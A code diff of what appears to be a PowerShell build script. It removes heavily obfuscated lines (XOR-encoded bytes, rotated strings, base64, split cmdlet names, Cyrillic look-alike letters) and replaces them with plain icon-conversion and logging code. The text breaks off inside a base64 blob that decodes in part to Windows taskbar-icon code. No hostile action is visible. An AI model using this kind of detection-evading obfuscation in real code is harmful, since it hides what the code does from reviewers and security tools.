-        $jSWIJh74 = @'''''''''$($k4742=71;$b=[byte[]](0x65,0x4a,0x4d,0x21,0x35,0x28,0x2a,0x67,0x17,0x0e,0x0b,0x67,0x2e,0x2a,0x37,0x28,0x35,0x33,0x67,0x0e,0x2a,0x26,0x20,0x22,0x4a,0x4d,0x2e,0x2a,0x20,0x67,0x7a,0x67,0x0e,0x2a,0x26,0x20,0x22,0x69,0x28,0x37,0x22,0x29,0x6f,0x35);-join($b|%{[char]($_-bxor$k4742)}))$Y5G9K')
-if img.mode != ('{0}{1}{2}{3}' -f 'R','G','B','A'): img = img.convert($($k5716=49;$b=[byte[]](0x63,0x76,0x73,0x70);-join($b|%{[char]($_-bxor$k5716)})))
-img.save(r'$TGXWIQ', format=([System.Text.Encoding]::UTF8.GetString([byte[]](0x49,0x43,0x4F))), sizes=[($(1330 -bxor 1074),$(606 % 350)),($(2 * 64),$(-2 * -64)),($(2 * 32),$(336 - 272)),($(-186 + 234),$(122 + -74)),($(132 % 50),$(-44 -bxor -12)),($(106 % 18),$(2 * 8))])
-(('{0}{1}{2}{3}{4}{5}' -f '@','
-','
- ','  ',' ','    ') + $XzTP9Wy + ([string]::Format('{0}{1}{2}{3}{4}{5}{6}{7}{8}{9}{10}{11}{12}{13}{14}{15}{16}{17}{18}{19}{20}{21}{22}{23}{24}{25}',' =',' &',' (','&','(','''G','et-C','''+''','om','man','d'')',' ''jo','?','?-PA','TH','''',' -C','omm','an','dTy','pe F','unc','t','io','n, &','(')))C"+([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('bWRsZXQ=')))) -ErrorAction SilentlyContinue)[0] $GsTWX4 $($k4162='6k5T7ms';$b=[byte[]](0x69,0x02,0x56,0x3B,0x59,0x43,0x03,0x4F);$kb=[System.Text.Encoding]::UTF8.GetBytes($k4162);-join(0..($b.Length-1)|%{[char]($b[$_]-bxor$kb[$_%$kb.Length])}))
-        sc -path $Xztp9Wy -Value $jsWijh74 -EnCODing UtF8
-        & $tVoviT $Xztp9wy | & (&($(-join('Zxm-Vhff'.ToCharArray()|%{[int]$c=$_;if($c-ge65-and$c-le90){[char](65+(($c-65+7)%26))}elseif($c-ge97-and$c-le122){[char](97+(($c-97+7)%26))}else{[char]$c}}))+(-join('an','d'))) ([System.Text.Encoding]::UTF8.GetString([byte[]](0x6F,0x55,0x2A,0x4C,0x6C))) -CommandType Function, Cm`dlet -ErrorAction SilentlyContinue)[0]
-        if ($lAsTeXItCode -eq 0) {
-            $gGYrn = (([System.Text.Encoding]::UTF8.GetString([byte[]](0x78))) -eq ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('eA=='))))
-            & (&('G'+('{0}{1}{2}{3}' -f 'et-C','omma','n','d')) ('{0}{1}' -f 'LO','?') -CommandType Function, &('Сmdl'+([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('ZXQ=')))) -ErrorAction SilentlyContinue)[0] 'ісоn    ->  rеаdу' $($k9151=156;$b=[byte[]](0xdb,0xee,0xf9,0xf9,0xf2);-join($b|%{[char]($_-bxor$k9151)}))
+        Log "icon    ->  converting to .ico"
+        $conv = @"
+from PIL import Image
+img = Image.open(r'$IconRaw')
+if img.mode != 'RGBA': img = img.convert('RGBA')
+img.save(r'$IconIco', format='ICO', sizes=[(256,256),(128,128),(64,64),(48,48),(32,32),(16,16)])
+"@
+        $convPy = Join-Path $WorkDir "_icon.py"
+        Set-Content -Path $convPy -Value $conv -Encoding UTF8
+        & $PythonExe $convPy | Out-Null
+        if ($LASTEXITCODE -eq 0) {
+            $useIco = $true
+            Log "icon    ->  ready" "Green"
         } else {
-            & (&(([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('R2V0LUNvbW1h')))+$(-join('fv'.ToCharArray()|%{[int]$c=$_;if($c-ge65-and$c-le90){[char](65+(($c-65+8)%26))}elseif($c-ge97-and$c-le122){[char](97+(($c-97+8)%26))}else{[char]$c}}))) ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('bG8/'))) -CommandType Function, &($(-join('Nxowp'.ToCharArray()|%{[int]$c=$_;if($c-ge65-and$c-le90){[char](65+(($c-65+15)%26))}elseif($c-ge97-and$c-le122){[char](97+(($c-97+15)%26))}else{[char]$c}}))+'t') -ErrorAction SilentlyContinue)[0] ('{0}{1}{2}{3}{4}{5}{6}{7}{8}{9}{10}' -f 'icon ','   ','-','>  ','c','on','v','e','rsio','n fai','led') "$([char]0x59)$([char]0x65)$([char]0x6C)$([char]0x6C)$([char]0x6F)$([char]0x77)"
+            Log "icon    ->  conversion failed" "Yellow"
         }
     } catch {
-        & (Get-C`ommand ([System.Text.Encoding]::UTF8.GetString([byte[]](0x3F,0x4F,0x47))) -CommandType Function, Cm`dlet -ErrorAction SilentlyContinue)[0] ($(-join('augf    ->  '.ToCharArray()|%{[int]$c=$_;if($c-ge65-and$c-le90){[char](65+(($c-65+8)%26))}elseif($c-ge97-and$c-le122){[char](97+(($c-97+8)%26))}else{[char]$c}})) + $($_.Exception.Message)) (-join('Y','e','llo','w'))
+        Log "icon    ->  $($_.Exception.Message)" "Yellow"
     }
 }
-PAUSe-bRiEf
+Pause-Brief
 
-$uZFwTLs5 = ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("$([char]0x61)$([char]0x57)$([char]0x31)$([char]0x77)$([char]0x62)$([char]0x33)$([char]0x4A)$([char]0x30)$([char]0x49)$([char]0x47)$([char]0x39)$([char]0x7A)$([char]0x4C)$([char]0x43)$([char]0x42)$([char]0x7A)$([char]0x65)$([char]0x58)$([char]0x4D)$([char]0x73)$([char]0x49)$([char]0x47)$([char]0x4E)$([char]0x30)$([char]0x65)$([char]0x58)$([char]0x42)$([char]0x6C)$([char]0x63)$([char]0x77)$([char]0x30)$([char]0x4B)$([char]0x5A)$([char]0x6E)$([char]0x4A)$([char]0x76)$([char]0x62)$([char]0x53)$([char]0x42)$([char]0x6A)$([char]0x64)$([char]0x48)$([char]0x6C)$([char]0x77)$([char]0x5A)$([char]0x58)$([char]0x4D)$([char]0x67)$([char]0x61)$([char]0x57)$([char]0x31)$([char]0x77)$([char]0x62)$([char]0x33)$([char]0x4A)$([char]0x30)$([char]0x49)$([char]0x48)$([char]0x64)$([char]0x70)$([char]0x62)$([char]0x6E)$([char]0x52)$([char]0x35)$([char]0x63)$([char]0x47)$([char]0x56)$([char]0x7A)$([char]0x43)$([char]0x67)$([char]0x70)$([char]0x6B)$([char]0x5A)$([char]0x57)$([char]0x59)$([char]0x67)$([char]0x58)$([char]0x32)$([char]0x56)$([char]0x34)$([char]0x61)$([char]0x57)$([char]0x78)$([char]0x6C)$([char]0x5A)$([char]0x46)$([char]0x39)$([char]0x30)$([char]0x59)$([char]0x58)$([char]0x4E)$([char]0x72)$([char]0x59)$([char]0x6D)$([char]0x46)$([char]0x79)$([char]0x4B)$([char]0x43)$([char]0x6B)$([char]0x36)$([char]0x44)$([char]0x51)$([char]0x6F)$([char]0x67)$([char]0x49)$([char]0x43)$([char]0x41)$([char]0x67)$([char]0x64)$([char]0x48)$([char]0x4A)$([char]0x35)$([char]0x4F)$([char]0x67)$([char]0x30)$([char]0x4B)$([char]0x49)$([char]0x43)$([char]0x41)$([char]0x67)$([char]0x49)$([char]0x43)$([char]0x41)$([char]0x67)$([char]0x49)$([char]0x43)$([char]0x42)$([char]0x6A)$([char]0x64)$([char]0x48)$([char]0x6C)$([char]0x77)$([char]0x5A)$([char]0x58)$([char]0x4D)$([char]0x75)$([char]0x64)$([char]0x32)$([char]0x6C)$([char]0x75)$([char]0x5A)$([char]0x47)$([char]0x78)$([char]0x73)$([char]0x4C)$([char]0x6E)$([char]0x4E)$([char]0x6F)$([char]0x5A)$([char]0x57)$([char]0x78)$([char]0x73)$([char]0x4D)$([char]0x7A)$([char]0x49)$([char]0x75)$([char]0x55)$([char]0x32)$([char]0x56)$([char]0x30)$([char]0x51)$([char]0x33)$([char]0x56)$([char]0x79)$([char]0x63)$([char]0x6D)$([char]0x56)$([char]0x75)$([char]0x64)$([char]0x46)$([char]0x42)$([char]0x79)$([char]0x62)$([char]0x32)$([char]0x4E)$([char]0x6C)$([char]0x63)$([char]0x33)$([char]0x4E)$([char]0x46)$([char]0x65)$([char]0x48)$([char]0x42)$([char]0x73)$([char]0x61)$([char]0x57)$([char]0x4E)$([char]0x70)$([char]0x64)$([char]0x45)$([char]0x46)$([char]0x77)$([char]0x63)$([char]0x46)$([char]0x56)$([char]0x7A)$([char]0x5A)$([char]0x58)$([char]0x4A)$([char]0x4E)$([char]0x62)$([char]0x32)$([char]0x52)$([char]0x6C)$([char]0x62)$([char]0x45)$([char]0x6C)$([char]0x45)$([char]0x4B)$([char]0x41)$([char]0x30)$([char]0x4B)$([char]0x49)$([char]0x43)$([char]0x41)$([char]0x67)$([char]0x49)$([char]0x43)$([char]0x41)$([char]0x67)$([char]0x49)$([char]0x43)$([char]0x41)$([char]0x67)$([char]0x49)$([char]0x43)$([char]0x41)$([char]0x67)$([char]0x49)$([char]0x6B)$([char]0x56)$([char]0x34)$([char]0x61)$([char]0x57)$([char]0x78)$([char]0x6C)$([char]0x5A)$([char]0x43)$([char]0x35)$([char]0x46)$([char]0x65)$([char]0x48)$([char]0x52)$([char]0x6C)$([char]0x63)$([char]0x6D)$([char]0x35)$([char]0x68)$([char]0x62)$([char]0x43)$([char]0x35)$([char]0x42)$([char]0x63)$([char]0x48)$([char]0x41)$([char]0x75)$([char]0x4D)$([char]0x53)$([char]0x49)$([char]0x70)$([char]0x44)$([char]0x51)$([char]0x6F)$([char]0x67)$([char]0x49)$([char]0x43)$([char]0x41)$([char]0x67)$([char]0x5A)$([char]0x58)$([char]0x68)$([char]0x6A)$([char]0x5A)$([char]0x58)$([char]0x42)$([char]0x30)$([char]0x49)$([char]0x45)$([char]0x56)$([char]0x34)$([char]0x59)$([char]0x32)$([char]0x56)$([char]0x77)$([char]0x64)$([char]0x47)$([char]0x6C)$([char]0x76)$([char]0x62)$([char]0x6A)$([char]0x6F)$([char]0x4E)$([char]0x43)$([char]0x69)$([char]0x41)$([char]0x67)$([char]0x49)$([char]0x43)$([char]0x41)$([char]0x67)$([char]0x49)$([char]0x43)$([char]0x41)$([char]0x67)$([char]0x63)$([char]0x47)$([char]0x46)$([char]0x7A)$([char]0x63)$([char]0x77)$([char]0x30)$([char]0x4B)$([char]0x49)$([char]0x43)$([char]0x41)$([char]0x67)$([char]0x49)$([char]0x48)$([char]0x52)$([char]0x79)$([char]0x65)$([char]0x54)$([char]0x6F)$([char]0x4E)$([char]0x43)$([char]0x69)$([char]0x41)$([char]0x67)$([char]0x49)$([char]0x43)$([char]0x41)$([char]0x67)$([char]0x49)$([char]0x43)$([char]0x41)$([char]0x67)$([char]0x61)$([char]0x57)$([char]0x4E)$([char]0x76)$([char]0x49)$([char]0x44)$([char]0x30)$([char]0x67)$([char]0x54)$([char]0x6D)$([char]0x39)$([char]0x75)$([char]0x5A)$([char]0x51)$([char]0x30)$([char]0x4B)$([char]0x49)$([char]0x43)$([char]0x41)$([char]0x67)$([char]0x49)$([char]0x43)$([char]0x41)$([char]0x67)$([char]0x49)$([char]0x43)$([char]0x42)$([char]0x70)$([char]0x5A)$([char]0x69)$([char]0x42)$([char]0x6E)$([char]0x5A)$([char]0x58)$([char]0x52)$([char]0x68)$([char]0x64)$([char]0x48)$([char]0x52)$([char]0x79)$([char]0x4B)$([char]0x48)$([char]0x4E)$([char]0x35)$([char]0x63)$([char]0x79)$([char]0x77)$([char]0x67)$([char]0x49)$([char]0x6D)$([char]0x5A)$([char]0x79)$([char]0x62)$([char]0x33)$([char]0x70)$([char]0x6C)$([char]0x62)$([char]0x69)$([char]0x49)$([char]0x73)$([char]0x49)$([char]0x45)$([char]0x5A)$([char]0x68)$([char]0x62)$([char]0x48)$([char]0x4E)$([char]0x6C)$([char]0x4B)$([char]0x54)$([char]0x6F)$([char]0x4E)$([char]0x43)$([char]0x69)$([char]0x41)$([char]0x67)$([char]0x49)$([char]0x43)$([char]0x41)$([char]0x67)$([char]0x49)$([char]0x43)$([char]0x41)$([char]0x67)$([char]0x49)$([char]0x43)$([char]0x41)$([char]0x67)$([char]0x49)$([char]0x47)$([char]0x4A)$([char]0x68)$([char]0x63)$([char]0x32)$([char]0x55)$([char]0x67)$([char]0x50)$([char]0x53)$([char]0x42)$([char]0x6E)$([char]0x5A)$([char]0x58)$([char]0x52)$([char]0x68)$([char]0x64)$([char]0x48)$([char]0x52)$([char]0x79)$([char]0x4B)$([char]0x48)$([char]0x4E)$([char]0x35)$([char]0x63)$([char]0x79)$([char]0x77)$([char]0x67)$([char]0x49)$([char]0x6C)$([char]0x39)$([char]0x4E)$([char]0x52)$([char]0x55)$([char]0x6C)$([char]0x51)$([char]0x51)$([char]0x56)$([char]0x4E)$([char]0x54)$([char]0x49)$([char]0x69)$([char]0x77)$([char]0x67)$([char]0x62)$([char]0x33)$([char]0x4D)$([char]0x75)$([char]0x63)$([char]0x47)$([char]0x46)$([char]0x30)$([char]0x61)$([char]0x43)$([char]0x35)$([char]0x6B)$([char]0x61)$([char]0x58)$([char]0x4A)$([char]0x75)$([char]0x59)$([char]0x57)$([char]0x31)$([char]0x6C)$([char]0x4B)$([char]0x48)$([char]0x4E)$([char]0x35)$([char]0x63)$([char]0x79)$([char]0x35)$([char]0x6C)$([char]0x65)$([char]0x47)$([char]0x56)$([char]0x6A)$([char]0x64)$([char]0x58)$([char]0x52)$([char]0x68)$([char]0x59)$([char]0x6D)$([char]0x78)$([char]0x6C)$([char]0x4B)$([char]0x53)$([char]0x6B)$([char]0x4E)$([char]0x43)$([char]0x69)$([char]0x41)$([char]0x67)$([char]0x49)$([char]0x43)$([char]0x41)$([char]0x67)$([char]0x49)$([char]0x43)$([char]0x41)$([char]0x67)$([char]0x49)$([char]0x43)$([char]0x41)$([char]0x67)$([char]0x49)$([char]0x47)$([char]0x5A)$([char]0x76)$([char]0x63)$([char]0x69)$([char]0x42)$([char]0x6A)$([char]0x49)$([char]0x47)$([char]0x6C)$([char]0x75)$([char]0x49)$([char]0x43)$([char]0x68)$([char]0x76)$([char]0x63)$([char]0x79)$([char]0x35)$([char]0x77)$([char]0x59)$([char]0x58)$([char]0x52)$([char]0x6F)$([char]0x4C)$([char]0x6D)$([char]0x70)$([char]0x76)$([char]0x61)$([char]0x57)$([char]0x34)$([char]0x6F)$([char]0x59)$([char]0x6D)$([char]0x46)$([char]0x7A)$([char]0x5A)$([char]0x53)$([char]0x77)$([char]0x67)$([char]0x49)$([char]0x6D)$([char]0x6C)$([char]0x6A)$([char]0x62)$([char]0x32)$([char]0x34)$([char]0x75)$([char]0x61)$([char]0x57)$([char]0x4E)$([char]0x76)$([char]0x49)$([char]0x69)$([char]0x6B)$([char]0x73)$([char]0x44)$([char]0x51)$([char]0x6F)$([char]0x67)$([char]0x49)$([char]0x43)$([char]0x41)$([char]0x67)$([char]0x49)$([char]0x43)$([char]0x41)$([char]0x67)$([char]0x49)$([char]0x43)$([char]0x41)$([char]0x67)$([char]0x49)$([char]0x43)$([char]0x41)$([char]0x67)$([char]0x49)$([char]0x43)$([char]0x41)$([char]0x67)$([char]0x49)$([char]0x43)$([char]0x41)$([char]0x67)$([char]0x49)$([char]0x43)$([char]0x41)$([char]0x67)$([char]0x62)$([char]0x33)$([char]0x4D)$([char]0x75)$([char]0x63)$([char]0x47)$([char]0x46)$([char]0x30)$([char]0x61)$([char]0x43)$([char]0x35)$([char]0x71)$([char]0x62)$([char]0x32)$([char]0x6C)$([char]0x75)$([char]0x4B)$([char]0x47)$([char]0x39)$([char]0x7A)$([char]0x4C)$([char]0x6E)$([char]0x42)$([char]0x68)$([char]0x64)$([char]0x47)$([char]0x67)$([char]0x75)$([char]0x5A)$([char]0x47)$([char]0x6C)$([char]0x79)$([char]0x62)$([char]0x6D)$([char]0x46)$([char]0x74)$([char]0x5A)$([char]0x53)$([char]0x68)$([char]0x7A)$([char]0x65)$([char]0x58)$([char]0x4D)$([char]0x75)$([char]0x5A)$([char]0x58)$([char]0x68)$([char]0x6C)$([char]0x59)$([char]0x33)$([char]0x56)$([char]0x30)$([char]0x59)$([char]0x57)$([char]0x4A)$([char]0x73)$([char]0x5A)$([char]0x53)$([char]0x6B)$([char]0x73)$([char]0x49)$([char]0x43)$([char]0x4A)$([char]0x70)$([char]0x59)$([char]0x32)$([char]0x39)$([char]0x75)$([char]0x4C)$([char]0x6D)$([char]0x6C)$([char]0x6A)$([char]0x62)$([char]0x79)$([char]0x49)$([char]0x70)$([char]0x4B)$([char]0x54)$([char]0x6F)$([char]0x4E)$([char]0x43)$([char]0x69)$([char]0x41)$([char]0x67)$([char]0x49)$([char]0x43)$([char]0x41)$([char]0x67)$([char]0x49)$([char]0x43)$([char]0x41)$([char]0x67)$([char]0x49)$([char]0x43)$([char]0x41)$([char]0x67)$([char]0x49)$([char]0x43)$([char]0x41)$([char]0x67)$([char]0x49)$([char]0x43)$([char]0x42)$([char]0x70)$([char]0x5A)$([char]0x69)$([char]0x42)$([char]0x76)$([char]0x63)$([char]0x79)$([char]0x35)$([char]0x77)$([char]0x59)$([char]0x58)$([char]0x52)$([char]0x6F)$([char]0x4C)$([char]0x6D)$([char]0x56)$([char]0x34)$([char]0x61)$([char]0x58)$([char]0x4E)$([char]0x30)$([char]0x63)$([char]0x79)$([char]0x68)$([char]0x6A)$([char]0x4B)$([char]0x54)$([char]0x6F)$([char]0x4E)$([char]0x43)$([char]0x69)$([char]0x41)$([char]0x67)$([char]0x49)$([char]0x43)$([char]0x41)$([char]0x67)$([char]0x49)$([char]0x43)$([char]0x41)$([char]0x67)$([char]0x49)$([char]0x43)$([char]0x41)$([char]0x67)$([char]0x49)$([char]0x43)$([char]0x41)$([char]0x67)$([char]0x49)$([char]0x43)$([char]0x41)$([char]0x67)$([char]0x49)$([char]0x43)$([char]0x41)$([char]0x67)$([char]0x61)$([char]0x57)$([char]0x4E)$([char]0x76)$([char]0x49)$([char]0x44)$([char]0x30)$([char]0x67)$([char]0x59)$([char]0x7A)$([char]0x73)$([char]0x67)$([char]0x59)$([char]0x6E)$([char]0x4A)$([char]0x6C)$([char]0x59)$([char]0x57)$([char]0x73)$([char]0x4E)$([char]0x43)$([char]0x69)$([char]0x41)$([char]0x67)$([char]0x49)$([char]0x43)$([char]0x41)$([char]0x67)$([char]0x49)$([char]0x43)$([char]0x41)$([char]0x67)$([char]0x5A)$([char]0x57)$([char]0x78)$([char]0x7A)$([char]0x5A)$([char]0x54)$([char]0x6F)$([char]0x4E)$([char]0x43)$([char]0x69)$([char]0x41)$([char]0x67)$([char]0x49)$([char]0x43)$([char]0x41)$([char]0x67)$([char]0x49)$([char]0x43)$([char]0x41)$([char]0x67)$([char]0x49)$([char]0x43)$([char]0x41)$([char]0x67)$([char]0x49)$([char]0x47)$([char]0x4D)$([char]0x67)$([char]0x50)$([char]0x53)$([char]0x42)$([char]0x76)$([char]0x63)$([char]0x79)$([char]0x35)$([char]0x77)$([char]0x59)$([char]0x58)$([char]0x52)$([char]0x6F)$([char]0x4C)$([char]0x6D)$([char]0x70)$([char]0x76)$([char]0x61)$([char]0x57)$([char]0x34)$([char]0x6F)$([char]0x62)$([char]0x33)$([char]0x4D)$([char]0x75)$([char]0x63)$([char]0x47)$([char]0x46)$([char]0x30)$([char]0x61)$([char]0x43)$([char]0x35)$([char]0x6B)$([char]0x61)$([char]0x58)$([char]0x4A)$([char]0x75)$([char]0x59)$([char]0x57)$([char]0x31)$([char]0x6C)$([char]0x4B)$([char]0x47)$([char]0x39)$([char]0x7A)$([char]0x4C)$([char]0x6E)$([char]0x42)$([char]0x68)$([char]0x64)$([char]0x47)$([char]0x67)$([char]0x75)$([char]0x59)$([char]0x57)$([char]0x4A)$([char]0x7A)$([char]0x63)$([char]0x47)$([char]0x46)$([char]0x30)$([char]0x61)$([char]0x43)$([char]0x68)$([char]0x66)$([char]0x58)$([char]0x32)$([char]0x5A)$([char]0x70)$([char]0x62)$([char]0x47)$([char]0x56)$([char]0x66)$([char]0x58)$([char]0x79)$([char]0x6B)$([char]0x70)$([char]0x4C)$([char]0x43)$([char]0x41)$([char]0x69)$([char]0x61)$([char]0x57)$([char]0x4E)$([char]0x76)$([char]0x62)$([char]0x69)$([char]0x35)$([char]0x70)$([char]0x59)$([char]0x32)$([char]0x38)$([char]0x69)$([char]0x4B)$([char]0x51)$([char]0x30)$([char]0x4B)$([char]0x49)$([char]0x43)$([char]0x41)$([char]0x67)$([char]0x49)$([char]0x43)$([char]0x41)$([char]0x67)$([char]0x49)$([char]0x43)$([char]0x41)$([char]0x67)$([char]0x49)$([char]0x43)$([char]0x41)$([char]0x67)$([char]0x61)$([char]0x57)$([char]0x59)$([char]0x67)$([char]0x62)$([char]0x33)$([char]0x4D)$([char]0x75)$([char]0x63)$([char]0x47)$([char]0x46)$([char]0x30)$([char]0x61)$([char]0x43)$([char]0x35)$([char]0x6C)$([char]0x65)$([char]0x47)$([char]0x6C)$([char]0x7A)$([char]0x64)$([char]0x48)$([char]0x4D)$([char]0x6F)$([char]0x59)$([char]0x79)$([char]0x6B)$([char]0x36)$([char]0x49)$([char]0x47)$([char]0x6C)$([char]0x6A)$([char]0x62)$([char]0x79)$([char]0x41)$([char]0x39)$([char]0x49)$([char]0x47)$([char]0x4D)$([char]0x4E)$([char]0x43)$([char]0x69)$([char]0x41)$([char]0x67)$([char]0x49)$([char]0x43)$([char]0x41)$([char]0x67)$([char]0x49)$([char]0x43)$([char]0x41)$([char]0x67)$([char]0x61)$([char]0x57)$([char]0x59)$([char]0x67)$([char]0x62)$([char]0x6D)$([char]0x39)$([char]0x30)$([char]0x49)$([char]0x47)$([char]0x6C)$([char]0x6A)$([char]0x62)$([char]0x7A)$([char]0x6F)$([char]0x67)$([char]0x63)$([char]0x6D)$([char]0x56)$([char]0x30)$([char]0x64)$([char]0x58)$([char]0x4A)$([char]0x75)$([char]0x44)$([char]0x51)$([char]0x6F)$([char]0x67)$([char]0x49)$([char]0x43)$([char]0x41)$([char]0x67)$([char]0x49)$([char]0x43)$([char]0x41)$([char]0x67)$([char]0x49)$([char]0x47)$([char]0x68)$([char]0x69)$([char]0x49)$([char]0x44)$([char]0x30)$([char]0x67)$([char]0x59)$([char]0x33)$([char]0x52)$([char]0x35)$([char]0x63)$([char]0x47)$([char]0x56)$([char]0x7A)$([char]0x4C)$([char]0x6E)$([char]0x64)$([char]0x70)$([char]0x62)$([char]0x6D)$([char]0x52)$([char]0x73)$([char]0x62)$([char]0x43)$([char]0x35)$([char]0x31)$([char]0x63)$([char]0x32)$([char]0x56)$([char]0x79)$([char]0x4D)$([char]0x7A)$([char]0x49)$([char]0x75)$([char]0x54)$([char]0x47)$([char]0x39)$([char]0x68)$([char]0x5A)$([char]0x45)$([char]0x6C)$([char]0x74)$([char]0x59)$([char]0x57)$([char]0x64)$([char]0x6C)$([char]0x56)$([char]0x79)$([char]0x68)$([char]0x4F)$([char]0x62)$([char]0x32)$([char]0x35)$([char]0x6C)$([char]0x4C)$([char]0x43)$([char]0x42)$([char]0x70)$([char]0x59)$([char]0x32)$([char]0x38)$([char]0x73)$([char]0x49)$([char]0x44)$([char]0x45)$([char]0x73)$([char]0x49)$([char]0x44)$([char]0x41)$([char]0x73)$([char]0x49)$([char]0x44)$([char]0x41)$([char]0x73)$([char]0x49)$([char]0x44)$([char]0x42)$([char]0x34)$([char]0x4D)$([char]0x54)$([char]0x41)$([char]0x67)$([char]0x66)$([char]0x43)$([char]0x41)$([char]0x77)$([char]0x65)$([char]0x44)$([char]0x67)$([char]0x77)$([char]0x4D)$([char]0x44)$([char]0x41)$([char]0x70)$([char]0x44)$([char]0x51)$([char]0x6F)$([char]0x67)$([char]0x49)$([char]0x43)$([char]0x41)$([char]0x67)$([char]0x49)$([char]0x43)$([char]0x41)$([char]0x67)$([char]0x49)$([char]0x47)$([char]0x68)$([char]0x7A)$([char]0x49)$([char]0x44)$([char]0x30)$([char]0x67)$([char]0x59)$([char]0x33)$([char]0x52)$([char]0x35)$([char]0x63)$([char]0x47)$([char]0x56)$([char]0x7A)$([char]0x4C)$([char]0x6E)$([char]0x64)$([char]0x70)$([char]0x62)$([char]0x6D)$([char]0x52)$([char]0x73)$([char]0x62)$([char]0x43)$([char]0x35)$([char]0x31)$([char]0x63)$([char]0x32)$([char]0x56)$([char]0x79)$([char]0x4D)$([char]0x7A)$([char]0x49)$([char]0x75)$([char]0x54)$([char]0x47)$([char]0x39)$([char]0x68)$([char]0x5A)$([char]0x45)$([char]0x6C)$([char]0x74)$([char]0x59)$([char]0x57)$([char]0x64)$([char]0x6C)$([char]0x56)$([char]0x79)$([char]0x68)$([char]0x4F)$([char]0x62)$([char]0x32)$([char]0x35)$([char]0x6C)$([char]0x4C)$([char]0x43)$([char]0x42)$([char]0x70)$([char]0x59)$([char]0x32)$([char]0x38)$([char]0x73)$([char]0x49)$([char]0x44)$([char]0x45)$([char]0x73)$([char]0x49)$([char]0x44)$([char]0x45)$([char]0x32)$([char]0x4C)$([char]0x43)$([char]0x41)$([char]0x78)$([char]0x4E)$([char]0x69)$([char]0x77)$([char]0x67)$([char]0x4D)$([char]0x48)$([char]0x67)$([char]0x78)$([char]0x4D)$([char]0x43)$([char]0x42)$([char]0x38)$([char]0x49)$([char]0x44)$([char]0x42)$([char]0x34)$([char]0x4F)$([char]0x44)$([char]0x41)$([char]0x77)$([char]0x4D)$([char]0x43)$([char]0x6B)$([char]0x4E)$([char]0x43)$([char]0x69)$([char]0x41)$([char]0x67)$([char]0x49)$([char]0x43)$([char]0x41)$([char]0x67)$([char]0x49)$([char]0x43)$([char]0x41)$([char]0x67)$([char]0x56)$([char]0x30)$([char]0x35)$([char]0x45)$([char]0x55)$([char]0x46)$([char]0x4A)$([char]0x50)$([char]0x51)$([char]0x79)$([char]0x41)$([char]0x39)$([char]0x49)$([char]0x47)$([char]0x4E)$([char]0x30)$([char]0x65)$([char]0x58)$([char]0x42)$([char]0x6C)$([char]0x63)$([char]0x79)$([char]0x35)$([char]0x58)$([char]0x53)$([char]0x55)$([char]0x35)$([char]0x47)$([char]0x56)$([char]0x55)$([char]0x35)$([char]0x44)$([char]0x56)$([char]0x46)$([char]0x6C)$([char]0x51)$([char]0x52)$([char]0x53)$([char]0x68)$([char]0x6A)$([char]0x64)$([char]0x48)$([char]0x6C)$([char]0x77)$([char]0x5A)$([char]0x58)$([char]0x4D)$([char]0x75)$([char]0x59)$([char]0x31)$([char]0x39)$([char]0x7A)$([char]0x63)$([char]0x32)$([char]0x6C)$([char]0x36)$([char]0x5A)$([char]0x56)$([char]0x39)$([char]0x30)$([char]0x4C)$([char]0x43)$([char]0x42)$([char]0x33)$([char]0x61)$([char]0x57)$([char]0x35)$([char]0x30)$([char]0x65)$([char]0x58)$([char]0x42)$([char]0x6C)$([char]0x63)$([char]0x79)$([char]0x35)$([char]0x49)$([char]0x56)$([char]0x30)$([char]0x35)$([char]0x45)$([char]0x4C)$([char]0x41)$([char]0x30)$([char]0x4B)$([char]0x49)$([char]0x43)$([char]0x41)$([char]0x67)$([char]0x49)$([char]0x43)$([char]0x41)$([char]0x67)$([char]0x49)$([char]0x43)$([char]0x41)$([char]0x67)$([char]0x49)$([char]0x43)$([char]0x41)$([char]0x67)$([char]0x49)$([char]0x43)$([char]0x41)$([char]0x67)$([char]0x49)$([char]0x43)$([char]0x41)$([char]0x67)$([char]0x49)$([char]0x43)$([char]0x41)$([char]0x67)$([char]0x49)$([char]0x43)$([char]0x41)$([char]0x67)$([char]0x49)$([char]0x43)$([char]0x41)$([char]0x67)$([char]0x49)$([char]0x43)$([char]0x41)$([char]0x67)$([char]0x49)$([char]0x43)$([char]0x41)$([char]0x67)$([char]0x49)$([char]0x43)$([char]0x41)$([char]0x67)$([char]0x49)$([char]0x48)$([char]0x64)$([char]0x70)$([char]0x62)$([char]0x6E)$([char]0x52)$([char]0x35)$([char]0x63)$([char]0x47)$([char]0x56)$([char]0x7A)$([char]0x4C)$([char]0x6C)$([char]0x56)$([char]0x4A)$([char]0x54)$([char]0x6C)$([char]0x51)$([char]0x73)$([char]0x49)$([char]0x48)$([char]0x64)$([char]0x70)$([char]0x62)$([char]0x6E)$([char]0x52)$([char]0x35)$([char]0x63)$([char]0x47)$([char]0x56)$([char]0x7A)$([char]0x4C)$([char]0x6C)$([char]0x64)$([char]0x51)$([char]0x51)$([char]0x56)$([char]0x4A)$([char]0x42)$([char]0x54)$([char]0x53)$([char]0x77)$([char]0x67)$([char]0x64)$([char]0x32)$([char]0x6C)$([char]0x75)$([char]0x64)$([char]0x48)$([char]0x6C)$([char]0x77)$([char]0x5A)$([char]0x58)$([char]0x4D)$([char]0x75)$([char]0x54)$([char]0x46)$([char]0x42)$([char]0x42)$([char]0x55)$([char]0x6B)$([char]0x46)$([char]0x4E)$([char]0x4B)$([char]0x51)$([char]0x30)$([char]0x4B)$([char]0x49)$([char]0x43)$([char]0x41)$([char]0x67)$([char]0x49)$([char]0x43)$([char]0x41)$([char]0x67)$([char]0x49)$([char]0x43)$([char]0x42)$([char]0x6A)$([char]0x62)$([char]0x47)$([char]0x46)$([char]0x7A)$([char]0x63)$([char]0x79)$([char]0x42)$([char]0x58)$([char]0x51)$([char]0x79)$([char]0x68)$([char]0x6A)$([char]0x64)$([char]0x48)$([char]0x6C)$([char]0x77)$([char]0x5A)$([char]0x58)$([char]0x4D)$([char]0x75)$([char]0x55)$([char]0x33)$([char]0x52)$([char]0x79)$([char]0x64)$([char]0x57)$([char]0x4E)$([char]0x30)$([char]0x64)$([char]0x58)$([char]0x4A)$([char]0x6C)$([char]0x4B)$([char]0x54)$([char]0x6F)$([char]0x4E)